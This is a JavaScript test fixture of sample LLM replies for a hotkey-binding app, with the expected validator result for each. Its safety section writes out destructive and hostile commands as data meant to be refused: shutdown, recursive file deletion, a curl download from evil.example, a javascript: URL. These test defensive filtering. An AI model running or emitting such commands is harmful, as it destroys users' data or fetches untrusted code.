'use strict';
// Typical replies from each model in the chain, good and bad, as seen in live runs and docs.
// expect: 'ok' (maybe repaired), 'refusal' (safe "can't"), 'invalid' (try the next model).
const G = { scope: 'global' };
const j = (o) => JSON.stringify(o);
const good = (trigger, action, extra = {}) => ({ ok: true, label: 'Test', profile: G, trigger, action, notes: '', ...extra });

module.exports = [
  // --- Gemini Flash-Lite: mostly clean JSON, sometimes fenced or with loose names
  { model: 'gemini', name: 'clean', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_url', url: 'https://www.youtube.com' })), expect: 'ok' },
  { model: 'gemini', name: 'fenced json', text: '```json\n' + j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_url', url: 'https://www.youtube.com' })) + '\n```', expect: 'ok' },
  { model: 'gemini', name: 'uppercase and alias key names', text: j(good({ mode: 'chord', keys: ['Control', 'Shift', 'T'] }, { type: 'key_combo', keys: ['CTRL', 'Escape'] })), expect: 'ok', check: (r) => r.trigger.keys.join() === 'ctrl,shift,t' && r.action.keys.join() === 'ctrl,esc' },
  { model: 'gemini', name: 'double-tap spelled with a dash', text: j(good({ mode: 'double-tap', keys: ['F8'] }, { type: 'lock_screen' })), expect: 'ok', check: (r) => r.trigger.mode === 'double_tap' },
  { model: 'gemini', name: 'url without scheme', text: j(good({ mode: 'tap', keys: ['f2'] }, { type: 'open_url', url: 'youtube.com' })), expect: 'ok', check: (r) => r.action.url === 'https://youtube.com' },
  { model: 'gemini', name: 'hold_ms out of range', text: j(good({ mode: 'hold', keys: ['p'], hold_ms: 99999 }, { type: 'screenshot' })), expect: 'ok', check: (r) => r.trigger.hold_ms === 5000 },
  { model: 'gemini', name: 'missing profile', text: j({ ok: true, label: 'x', trigger: { mode: 'tap', keys: ['f7'] }, action: { type: 'lock_screen' } }), expect: 'ok', check: (r) => r.profile.scope === 'global' },
  { model: 'groq-gpt-oss-120b', name: 'Gaming profile with no process names gets the Gaming processes', text: j(good({ mode: 'hold', keys: ['q'], hold_ms: 2000 }, { type: 'type_text', text: 'gg' }, { profile: { scope: 'app', name: 'Gaming' } })), expect: 'ok', check: (r) => r.profile.name === 'Gaming' && r.profile.process_names.join() === 'javaw.exe,minecraft.exe' },
  { model: 'gemini', name: 'app profile with only a process gets a name', text: j(good({ mode: 'tap', keys: ['f8'] }, { type: 'key_combo', keys: ['ctrl', 'shift', 't'] }, { profile: { scope: 'app', process_names: ['chrome.exe'] } })), expect: 'ok', check: (r) => r.profile.name === 'Chrome' },
  { model: 'gemini', name: 'unknown app profile name alone is kept for the app to match', text: j(good({ mode: 'tap', keys: ['f8'] }, { type: 'lock_screen' }, { profile: { scope: 'app', name: 'Krita' } })), expect: 'ok', check: (r) => r.profile.name === 'Krita' && r.profile.process_names.length === 0 },
  { model: 'gemini', name: 'app profile with neither name nor process is invalid', text: j(good({ mode: 'tap', keys: ['f8'] }, { type: 'lock_screen' }, { profile: { scope: 'app' } })), expect: 'invalid' },
  { model: 'gemini', name: 'Minecraft profile renamed to Gaming', text: j(good({ mode: 'tap', keys: ['r'] }, { type: 'auto_click', button: 'left', cps: 15, click_mode: 'hold' }, { profile: { scope: 'app', name: 'Minecraft', process_names: ['javaw.exe'] } })), expect: 'ok', check: (r) => r.profile.name === 'Gaming' },
  { model: 'gemini', name: 'modifier+key sent as tap', text: j(good({ mode: 'tap', keys: ['ctrl', 'q'] }, { type: 'type_text', text: 'hi' })), expect: 'ok', check: (r) => r.trigger.mode === 'chord' },
  { model: 'gemini', name: 'off-topic', text: j({ ok: false, not_binding: true, error: 'Not a key binding.' }), expect: 'refusal', check: (r) => r.not_binding === true },
  { model: 'gemini', name: 'invented key name', text: j(good({ mode: 'tap', keys: ['mouse4'] }, { type: 'lock_screen' })), expect: 'invalid' },
  { model: 'gemini', name: 'truncated by max_tokens', text: '{"ok":true,"label":"Work mode","profile":{"scope":"global"},"trigger":{"mode":"tap","keys":["f6"]},"action":{"type":"macro","steps":[{"op":"app"', expect: 'invalid' },
  // --- Groq gpt-oss: JSON mode, but sometimes a wrong action name or prose
  { model: 'groq-gpt-oss', name: 'unknown action type', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_website', url: 'https://x.com' })), expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'prose only', text: 'I can help you with that! Press F9 to open YouTube.', expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'chord without modifier', text: j(good({ mode: 'chord', keys: ['a', 'b'] }, { type: 'lock_screen' })), expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'tap with two keys', text: j(good({ mode: 'tap', keys: ['f1', 'f2'] }, { type: 'lock_screen' })), expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'macro with unknown op', text: j(good({ mode: 'tap', keys: ['f6'] }, { type: 'macro', steps: [{ op: 'run', target: 'x' }] })), expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'refusal without a reason', text: j({ ok: false }), expect: 'invalid' },
  { model: 'groq-gpt-oss', name: 'cps too high', text: j(good({ mode: 'tap', keys: ['f6'] }, { type: 'auto_click', button: 'right', cps: 500, click_mode: 'toggle' })), expect: 'ok', check: (r) => r.action.cps === 50 },
  { model: 'groq-gpt-oss', name: 'autoclick on a hold trigger', text: j(good({ mode: 'hold', keys: ['r'], hold_ms: 800 }, { type: 'auto_click', button: 'left', cps: 10, click_mode: 'hold' })), expect: 'ok', check: (r) => r.trigger.mode === 'tap' && r.trigger.hold_ms === undefined },
  { model: 'groq-gpt-oss', name: 'nine bindings', text: j({ ok: true, bindings: Array.from({ length: 9 }, (_v, i) => good({ mode: 'tap', keys: [`f${i + 1}`] }, { type: 'lock_screen' })) }), expect: 'invalid' },
  // --- Qwen on Groq: think blocks before the JSON
  { model: 'groq-qwen', name: 'think block then JSON', text: '<think>The user wants F9.</think>\n' + j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_app', app: 'notepad.exe' })), expect: 'ok' },
  { model: 'groq-qwen', name: 'single quotes (not JSON)', text: "{'ok': True, 'label': 'x'}", expect: 'invalid' },
  // --- Gemma (no JSON mode): chatty wrapper around the JSON
  { model: 'gemma', name: 'preamble and fence', text: 'Here is the binding:\n```json\n' + j(good({ mode: 'leader', keys: ['g'] }, { type: 'open_url', url: 'https://www.google.com/search?q=weather' })) + '\n```\nLet me know!', expect: 'ok' },
  { model: 'gemma', name: 'leader key put in keys', text: j(good({ mode: 'leader', keys: ['f13', 'y'] }, { type: 'lock_screen' })), expect: 'invalid' },
  { model: 'gemma', name: 'ok as a string', text: j({ ...good({ mode: 'tap', keys: ['f7'] }, { type: 'lock_screen' }), ok: 'true' }), expect: 'ok' },
  // --- Safety: every model must be stopped by the server
  { model: 'any', name: 'panic chord as trigger', text: j(good({ mode: 'chord', keys: ['ctrl', 'alt', 'shift', 'esc'] }, { type: 'lock_screen' })), expect: 'refusal' },
  { model: 'any', name: 'ctrl+alt+delete as trigger', text: j(good({ mode: 'chord', keys: ['ctrl', 'alt', 'del'] }, { type: 'lock_screen' })), expect: 'refusal' },
  { model: 'any', name: 'panic chord as action is fine? no: never press it', text: j(good({ mode: 'tap', keys: ['f1'] }, { type: 'key_combo', keys: ['ctrl', 'alt', 'shift', 'esc'] })), expect: 'refusal' },
  { model: 'any', name: 'task manager shortcut as action is fine', text: j(good({ mode: 'chord', keys: ['ctrl', 'alt', 'm'] }, { type: 'key_combo', keys: ['ctrl', 'shift', 'esc'] })), expect: 'ok' },
  { model: 'any', name: 'shutdown command', text: j(good({ mode: 'tap', keys: ['f12'] }, { type: 'run_command', command: 'shutdown /s /t 0' })), expect: 'refusal' },
  { model: 'any', name: 'restart via powershell', text: j(good({ mode: 'tap', keys: ['f12'] }, { type: 'run_command', command: 'powershell Restart-Computer' })), expect: 'refusal' },
  { model: 'any', name: 'sign out', text: j(good({ mode: 'tap', keys: ['f12'] }, { type: 'run_command', command: 'logoff' })), expect: 'refusal' },
  { model: 'any', name: 'delete files', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'run_command', command: 'del /q %TEMP%\\*' })), expect: 'refusal' },
  { model: 'any', name: 'remove-item', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'run_command', command: 'Remove-Item -Recurse C:\\Users\\me\\Downloads' })), expect: 'refusal' },
  { model: 'any', name: 'change default audio device', text: j(good({ mode: 'tap', keys: ['f10'] }, { type: 'run_command', command: 'nircmd setdefaultsounddevice "Headphones"' })), expect: 'refusal' },
  { model: 'any', name: 'audio settings via app', text: j(good({ mode: 'tap', keys: ['f10'] }, { type: 'open_app', app: 'mmsys.cpl' })), expect: 'refusal' },
  { model: 'any', name: 'download code', text: j(good({ mode: 'tap', keys: ['f10'] }, { type: 'run_command', command: 'curl https://evil.example/x.ps1 -o x.ps1' })), expect: 'refusal' },
  { model: 'any', name: 'open cmd', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_app', app: 'cmd.exe' })), expect: 'refusal' },
  { model: 'any', name: 'open a script file', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_path', path: 'C:\\tools\\wipe.bat' })), expect: 'refusal' },
  { model: 'any', name: 'app with switches in a macro', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'macro', steps: [{ op: 'app', target: 'chrome.exe', args: ['--disable-web-security'] }] })), expect: 'refusal' },
  { model: 'any', name: 'javascript url', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'open_url', url: 'javascript:alert(1)' })), expect: 'refusal' },
  { model: 'any', name: 'harmless run_command passes (app asks to confirm)', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'run_command', command: 'code C:\\projects\\site' })), expect: 'ok' },
  { model: 'any', name: 'typing the word shutdown is fine', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'type_text', text: 'brb, the server shutdown is at 5' })), expect: 'ok' },
  { model: 'any', name: 'typing a destructive command line', text: j(good({ mode: 'tap', keys: ['f9'] }, { type: 'macro', steps: [{ op: 'text', text: 'shutdown /s /t 0' }, { op: 'key', key: 'enter' }] })), expect: 'refusal' },
  { model: 'any', name: 'batch keeps the safe ones and notes the rest', text: j({ ok: true, bindings: [good({ mode: 'tap', keys: ['f9'] }, { type: 'open_url', url: 'https://www.youtube.com' }), good({ mode: 'tap', keys: ['f12'] }, { type: 'run_command', command: 'shutdown -r' })] }), expect: 'ok', check: (r) => r.bindings.length === 1 && /Left out one binding/.test(r.bindings[0].notes) },
  // --- v1.3.5: Copilot key, Caps Lock, tap vs hold, macropad apps
  { model: 'any', name: 'copilot key opens cursor', text: j(good({ mode: 'tap', keys: ['Copilot key'] }, { type: 'open_app', app: 'cursor.exe' })), expect: 'ok', check: (r) => r.trigger.keys.join() === 'copilot' },
  { model: 'any', name: 'win shift f23 chord becomes the copilot key', text: j(good({ mode: 'chord', keys: ['win', 'shift', 'f23'] }, { type: 'lock_screen' })), expect: 'ok', check: (r) => r.trigger.keys.join() === 'copilot' && r.trigger.mode === 'tap' },
  { model: 'any', name: 'copilot key is never sent', text: j(good({ mode: 'tap', keys: ['f1'] }, { type: 'key_combo', keys: ['copilot'] })), expect: 'invalid' },
  { model: 'any', name: 'caps lock tap esc hold ctrl', text: j(good({ mode: 'hold', keys: ['caps lock'], hold_ms: 200, keep_held: true }, { type: 'key_combo', keys: ['ctrl'] }, { tap_action: { type: 'key_combo', keys: ['esc'] } })), expect: 'ok', check: (r) => r.trigger.keys.join() === 'caps_lock' && r.trigger.hold_ms === 200 && r.trigger.keep_held === true && r.tap_action.keys.join() === 'esc' },
  { model: 'any', name: 'turn caps lock off', text: j(good({ mode: 'tap', keys: ['caps_lock'] }, { type: 'none' })), expect: 'ok', check: (r) => r.action.type === 'none' },
  { model: 'any', name: 'tap play pause hold spotify', text: j(good({ mode: 'hold', keys: ['f9'], hold_ms: 400 }, { type: 'open_app', app: 'spotify.exe' }, { tap_action: { type: 'media', media: 'media_play_pause' } })), expect: 'ok', check: (r) => r.tap_action.type === 'media' && r.trigger.hold_ms === 400 },
  { model: 'any', name: 'unsafe tap side is refused', text: j(good({ mode: 'hold', keys: ['f9'], hold_ms: 400 }, { type: 'lock_screen' }, { tap_action: { type: 'run_command', command: 'shutdown -s' } })), expect: 'refusal' },
  { model: 'any', name: 'OBS profile from the name alone', text: j(good({ mode: 'tap', keys: ['f13'] }, { type: 'key_combo', keys: ['ctrl', 'shift', 'r'] }, { profile: { scope: 'app', name: 'OBS' } })), expect: 'ok', check: (r) => r.profile.process_names.join() === 'obs64.exe' },
];
